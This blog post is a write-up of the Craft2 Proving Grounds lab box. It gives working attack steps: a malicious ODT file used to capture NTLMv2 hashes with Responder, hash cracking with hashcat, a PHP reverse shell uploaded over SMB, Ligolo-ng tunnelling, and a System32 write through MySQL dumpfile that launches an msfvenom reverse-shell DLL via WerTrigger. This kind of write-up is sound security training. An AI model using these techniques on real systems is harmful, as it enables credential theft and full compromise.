---
layout: writeup
title: Craft2 - Proving Grounds
date: 2024-08-15 13:32:20 +0300
description: A Writeup of the Craft2 Box from Proving Grounds
image: # /assets/images/Flu/Flu_1.png
fig-caption: # Add figcaption (optional)
tags: [Windows, TJ Null, Ligolo, PHPMyAdmin, MySQL, Chisel]
---

Ok, here's a writeup of Craft2 from [Proving Grounds](https://www.offsec.com/labs/). It is part of TJ Null’s OSCP [lab prep list](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#), and Proving Grounds has rated it to be Hard, though the Proving Grounds Community has rated it as Very Hard. Hopefully nothing too crazy. (In retrospect, it was a good deal harder than most of these have been.) As usual, I kick things off with an nmap scan, though I'm trying nmapAutomator for this. 

```
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
|_http-title: Craft
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
49666/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-08-14T20:53:37
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

Port 80 is usually a pretty important port when it's open, so I check it out with the browser and run a directory scan in the background. 

![Craft21.png](/assets/images/Craft2/Craft21.png){: .responsive-image}

It looks like we have a website called craft, and we can see from the bottom that there is both an upload function and a admin email for the domain of `craft.offsec`.  I add that to my /etc/hosts file. 

![Craft22.png](/assets/images/Craft2/Craft22.png){: .responsive-image}

This box seems immediately familiar to me, and it should because there is a Craft box. Initially I thought maybe it reminded me of the PEN-200 course, but then when I searched through my notes for relevant info, I realized I'd already done the first Craft and just not done a writeup for it. Maybe I will.

 For the directory scan I see an `upload.php` and an `/uploads` folder, which combine to suggest a file inclusion vulnerability. Before diving too deeply into that I check to see if I can access the SMB server on port 445, but I cannot seem to even list the shares because of an `NT_STATUS_ACCESS_DENIED` code. I likewise don't find anything quickly over rpc. So I will need to dig in on the upload function I guess. I open Burp to get started. 

We start by uploading a php reverse shell, but it looks like the site wants us to use the ODT extension. 

![Craft23.png](/assets/images/Craft2/Craft23.png){: .responsive-image}

We have a couple options here. We can try and spoof this file type, or we can potentially craft a malicious ODT file if we can figure out how to do that. I actually try a couple of things here playing around in Burp Suite, like trying to upload an .htaccess file to execute ODT files as php (not allowed) and trying to spoof the Content-Type. 

![Craft24.png](/assets/images/Craft2/Craft24.png){: .responsive-image}

Also not allowed.  Then I search my notes and realize that there is a similar path in the first Craft box that involves uploading a file with a malicious macro. So I try that again. 

![Craft25.png](/assets/images/Craft2/Craft25.png){: .responsive-image}

They're on to us. I search around for a different way to exploit malicious ODT files, and I find [this](https://secureyourit.co.uk/wp/2018/05/01/creating-malicious-odt-files/). Essentially the steps are as follows:

1. Create an ODT Document
2. Insert -> Object -> OLE Object
3. Pick whatever jpg you want. I used a portait of Orville Redenbacher. 
4. Save the file (as .odt). 
5. Rename the file to .zip. 
6. Open the .zip file and access the `content.xml` file with a text editor. 
7. Toward the bottom, there will be a link to the picture like so: ![Craft26.png](/assets/images/Craft2/Craft26.png){: .responsive-image} Change it to `xlink:href="file://$kaliIP/whatever.jpg`. 
8. Save the file (it will be a zip still).
9. Change the file type back to .odt. 
10. Upload the file. 

This will cause the target server to search for the link you've given to your own machine. In my case, I've started responder with `sudo responder -I tun0` which allows us to catch the NTLMv2 hash of the user on the remote server. 

![Craft27.png](/assets/images/Craft2/Craft27.png){: .responsive-image}

We can save this hash and crack it with hashcat. `hashcat -m 5600 $hash /usr/share/wordlists/rockyou.txt` does the trick pretty quickly because `5600` is for NTLMv2. 

![Craft28.png](/assets/images/Craft2/Craft28.png){: .responsive-image}

And we get `thecybergeek:winniethepooh` as our credentials. I tried a couple things to use these creds (impacket-smbexec), but not for very long before I decided to try the smb server with them. 

```
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WebApp          Disk      
```

We get access, and it becomes pretty clear that the WebApp share is the web root of the Craft application.

![Craft29.png](/assets/images/Craft2/Craft29.png){: .responsive-image}

I create a reverse shell using the PHP shell from Ivan Sincek on [revshells.com](revshells.com), put it on the smb share, and access it via `http://$targetIP/ivan.php.` 

![Craft210.png](/assets/images/Craft2/Craft210.png){: .responsive-image}

And we get a shell as the `apache`. I spent some time trying to figure out what to do next. I noticed from winpeas that there are a ton of suggested exploits, and I tried a few of these. 

![Craft211.png](/assets/images/Craft2/Craft211.png){: .responsive-image}

I couldn't really get anything working though. In the screenshot below there is an unquoted file service path I got where with, and there is also a MySQL service shown as well. 

![Craft212.png](/assets/images/Craft2/Craft212.png){: .responsive-image}

I got stuck here for a while because I didn't think much of the SQl server running. There were no creds for it, and it's just not that rare for the lab boxes to have one running by default because so many of them using a web application that comes with it. That was a mistake it turns out. I finally caved and looked for hints, and it became clear that we need to check it out, more so for the phpMyAdmin portal that was using it than anything else. We can do that by forwarding the port to our target machine. The writeups I saw used chisel, but I prefer [Ligolo-ng](https://github.com/nicocha30/ligolo-ng)so I used that with the below commands. 

From Kali:
1. `sudo ip tuntap add user pop mode tun ligolo`
2. `sudo ip link set ligolo up`
3. `sudo ip route add $targetIP.0/24 dev ligolo`
4. `sudo ./proxy -selfcert`

From Windows Target (agent file):
1. `.\ligolo.exe -connect $kaliIP:11601 -ignore-cert`

From Kali again:
1. `ip route add 240.0.0.1/32 dev ligolo`

Then we can access the target's ports over port 240.0.0.1. I tried running: `mysql -h 240.0.0.1 -u root -p`, but I got an error of `ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it`. I tried with `--ssl-mode=DISABLED`, but it said it was an unknown varaible. I can kind of see it over the browser, so the ligolo connection is working. 

![Craft213.png](/assets/images/Craft2/Craft213.png){: .responsive-image}

One thing to think about it the system as a whole. It's a LAMP stack, meaning Linux (the OS), Apache (the web server), MySQL (db), and PHP (the language). This is how a lot of the lab boxes are set up, and there is a web portal for them called PHPMyAdmin. Sometimes we need to access it over the course of a lab and sometimes we don't. In this case, there actually is a clue early on in the form of a Admin Login link on the Craft website. 

![Craft214.png](/assets/images/Craft2/Craft214.png){: .responsive-image}


If you click it, you get a pop up in the form of a`javascript:alert('Under Constuction)'`. But this is how the website *and* the DB are managed. You can see that by going to view port 80 of 240.0.0.1 port, by default in the browser. 

![Craft215.png](/assets/images/Craft2/Craft215.png){: .responsive-image}

At this point, it becomes really important the MySQL in this case has the ability to do privileged writes, meaning that we can write into directories out apache user doesn't have permission to write to. Now if we execute from those directories, it doesn't mean that it will execute as admin (I tried to move a reverse shell in System32 and execute it), but there are some additional exploits we can run if we have this capability. [PayloadsAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#wertrigger)has some examples for us here, and we can go with [WerTrigger](https://github.com/sailay1996/WerTrigger). *It looks like there are a couple of other options, but they require us to build something which is iffy when I'm using ARM or to write to a directory which we cannot do using the SQL portal in PHPMyAdmin.* We need to clone the repo, the upload three files into System32, though in our case we're going to replace one of them (phoneinfo.dll) with a reverse shell generated using msfvenom: ` msfvenom -p windows/x64/shell_reverse_tcp LHOST=$kaliIP LPORT=445 -f dll > phoneinfo.dll`. We then upload all of these using the smb server (any method will do of course) and then transfer them using the SQL page from within PHPMyAdmin. 

```
select load_file('C:\\xampp\\htdocs\\phoneinfo.dll') into dumpfile 'C:\\Windows\\system32\\phoneinfo.dll';
select load_file('C:\\xampp\\htdocs\\Report.wer') into dumpfile 'C:\\Windows\\system32\\Report.wer';
select load_file('C:\\xampp\\htdocs\\WerTrigger.exe') into dumpfile 'C:\\Windows\\system32\\WerTrigger.exe';
```

![Craft216.png](/assets/images/Craft2/Craft216.png){: .responsive-image}

After that we simply run WerTrigger.exe, and it executes the phoneinfo.dll with privileges, giving us a hit on our reverse shell. 

![Craft217.png](/assets/images/Craft2/Craft217.png){: .responsive-image}

And we have `NT Authority\System`. 

Lessons learned: There's a lot going on here, so I'm going to break it up actually. 

1. Creating a malicious ODT File

I had done something like this previously with the Craft box (no writeup, maybe I'll add later), but I wasn't familiar with this method. Fortunately it was pretty easy with the [link](2018) I found, but after looking at some writeups later on, it does seem like there may be some automated exploits. [This writeup](https://medium.com/@Dpsypher/proving-grounds-practice-craft2-cf520e6fb34f)has an exploit listed, but as it discusses, there is a more recent exploit the author found [here](https://github.com/rmdavy/badodf/blob/master/badodt.py). I didn't use it, but it looks pretty cool. 

2. Port Forwarding

So this part stood out to me because I got stuck here not having noticed the MySQL server. You see them often enough in labs like this purely because of the LAMP stack I mentioned. so many labs use some kind of web app to get started which have a SQL server active by default, but you never touch it, so sometimes I ignored it. That's bad. 

But when I did look it up, I saw people using Chisel to forward a port to the target machine. I prefer Ligolo-ng because the syntax is more familiar to me, but I didn't get it working initially, so I tried Chisel. With Chisel, I pretty much copied and pasted the commands, and I don't show them here because I went back and figured out how to do it with Ligolo-ng afterwards. In hindsight, I think I just needed to reset, and the experience made me feel *more* confident that Ligolo works better for me. 

3. Privileged Write Exploit

I guess I hadn't seen these before, but I got really stuck at the Privesc portion of the box, and I'm not sure how I would have gotten it done without a writeup. I actually noticed phpMyAdmin when enumerating initally (bc I've used it personally) but thought little of it. When I get a new shell, I have a habit of running `cd ..` then `ls` or `dir` on my way to the root directory, and I even noticed `C:\xampp\passwords.txt` early on. But I didn't think to forward a port and check there. 

![Craft218.png](/assets/images/Craft2/Craft218.png){: .responsive-image}

And **even then** had I check phpMyAdmin, I'm not sure how I would have noticed privileged write access. If anything I would have just spent way more time trying to run the exploits suggested by winpeas. So that's a lesson learned. I wasn't familiar with this escalation path, and now I am. 

4. All in all, this just felt like a much more realistic scenario than most of these boxes. Probably there would still be a password for the phpMyAdmin portal, but a ton of these boxes just have a 5 year old web app with exploits running and then some obvious, deliberate misconfiguration. 